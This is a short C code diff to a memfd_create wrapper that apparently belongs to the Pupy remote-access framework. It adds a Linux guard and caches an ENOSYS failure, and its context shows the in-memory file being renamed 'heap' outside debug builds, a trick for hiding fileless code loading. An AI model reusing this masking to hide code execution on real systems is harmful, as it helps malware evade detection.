@@ -5,6 +5,7 @@
 #include <sys/syscall.h>
 #include <string.h>
 #include <stdbool.h>
+#include <errno.h>
 
 #define MFD_CLOEXEC         0x0001U
 #define MFD_ALLOW_SEALING   0x0002U
@@ -30,19 +31,33 @@
 
 inline static int pupy_memfd_create(char *path, unsigned int path_size)
 {
+#ifdef Linux
+
 #ifndef DEBUG
 	memset(path, 0x0, path_size);
 	strncpy(path, "heap", path_size);
 #endif
 
+    /* Do not make syscall billion times */
+    static bool memfd_works = true;
+
+    if (!memfd_works)
+      return -1;
+
     int fd = syscall(__NR_memfd_create, path, MFD_CLOEXEC | MFD_ALLOW_SEALING);
 
     if (fd == -1) {
+		if (errno == ENOSYS)
+			memfd_works = false;
+
         return -1;
     }
 
     snprintf(path, path_size, MEMFD_FILE_PATH "%d", getpid(), fd);
     return fd;
+#else
+	return -1;
+#endif
 }
 
 inline static bool is_memfd_path(const char *path)
